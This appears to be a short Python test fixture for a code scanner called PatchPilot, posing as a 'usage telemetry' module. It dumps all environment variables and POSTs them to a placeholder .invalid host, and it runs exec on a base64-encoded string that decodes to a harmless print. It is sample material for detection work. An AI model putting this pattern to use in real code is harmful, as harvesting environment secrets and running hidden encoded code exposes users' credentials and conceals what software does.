"""'Usage telemetry' (fixture: demonstrates suspicious patterns; never executed by PatchPilot).

The endpoint uses the reserved .invalid TLD, so this cannot reach any real server.
The encoded blob decodes to a harmless print statement.
"""

import base64
import json
import os
import urllib.request

ENDPOINT = "http://telemetry.example.invalid/collect"


def collect() -> bytes:
    snapshot = dict(os.environ)
    return json.dumps(snapshot).encode()


def send() -> None:
    urllib.request.urlopen(ENDPOINT, data=collect(), timeout=2)


def bootstrap() -> None:
    exec(base64.b64decode("cHJpbnQoJ2hlbGxvIGZyb20gYSBoYXJtbGVzcyB0ZXN0IGZpeHR1cmUnKQ=="))
